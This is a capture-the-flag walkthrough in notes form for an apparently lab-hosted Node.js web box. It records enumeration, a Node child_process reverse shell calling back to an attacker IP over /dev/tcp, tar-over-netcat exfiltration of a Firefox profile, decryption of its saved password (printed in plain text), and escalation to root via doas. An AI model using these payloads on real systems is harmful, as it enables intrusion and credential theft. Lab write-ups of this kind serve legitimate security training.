@@ -1,0 +1,110 @@
+# http://10.10.70.1
+
+
+## nmap
+┌──(kishore㉿kali)-[~]
+└─$ nmap -sC -sV 10.10.70.1   
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-06 12:05 IST
+Nmap scan report for 10.10.70.1
+Host is up (0.17s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+## gobuster
+/secret -> /api/access
+"dGhpc19pc19ub3RfcmVhbA==" base64 decode -> this_is_not_real
+set this in cookie value and refresh to the default page
+
+
+
+## Scripts?
+(async function () {
+  const container = document.getElementById('items');
+  await fetch('/api/items')
+    .then((response) => response.json())
+    .then((response) => {
+      response.sins.forEach((element) => {
+        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+      response.errors.forEach((element) => {
+        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+      response.deaths.forEach((element) => {
+        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+    });
+
+  const buttons = document.querySelectorAll('.btn');
+  const items = document.querySelectorAll('.item');
+  buttons.forEach((button) => {
+    button.addEventListener('click', (event) => {
+      event.preventDefault();
+      const filter = event.target.innerText;
+      items.forEach((item) => {
+        if (filter === 'all') {
+          item.style.display = 'flex';
+        } else {
+          if (item.classList.contains(filter)) {
+            item.style.display = 'flex';
+          } else {
+            item.style.display = 'none';
+          }
+        }
+      });
+    });
+  });
+})();
+
+
+/api/items -> get and post
+with POST , curl -X POST http://10.10.70.1/api/items -> there_is_a_glitch_in_the_matrix
+going to set this one and try it, nothing came and reset with the older value this_is_not_real
+
+
+ffuf -c -w /usr/share/wordlists/wfuzz/general/common.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "FUZZ=test" -u http://10.10.70.1/api/items
+not working
+wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -X POST --h 45 -u http://10.10.70.1/api/items/?FUZZ\=test
+got it, cmd
+
+
+## curl
+curl -X POST http://10.10.70.1/api/items?cmd=test
+okay for now it is node js one can we try to get the rce with the nodejs
+
+trying like this
+bash rce: bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+require('child_process').exec("bash -c 'exec bash -i &>/dev/tcp/10.8.20.224/4444 <&1'")
+curl -X POST http://10.10.70.1/api/items?cmd=require%28%27child_process%27%29.exec%28%20%E2%80%9Cbash%20-c%20%27bash%20-i%20%26%3E%2Fdev%2Ftcp%2F%24RHOST%2F%24RPORT%20%3C%261%27%E2%80%9D%29
+
+curl -X POST http://10.10.70.1/api/items?cmd=require%28%27child_process%27%29.exec%28%22bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F10.8.20.224%2F4444%20%3C%261%27%22%29
+
+cd home / user / cat user.txt
+
+## .firefox
+tar cf - .firefox/ | nc ip 1234
+nc -lvnp 1234 > out.tar
+tar xvf out.tar
+.firefox
+firefox decrypt: https://github.com/unode/firefox_decrypt
+firefox decrypt : python3 firefox_decrypt.py release
+su v0id, password: 
+website:   https://glitch.thm
+Username: 'v0id'
+Password: 'love_the_void'
+
+done
+
+now , su v0id, enter password
+doas -u root /bin/bash
+
+
+
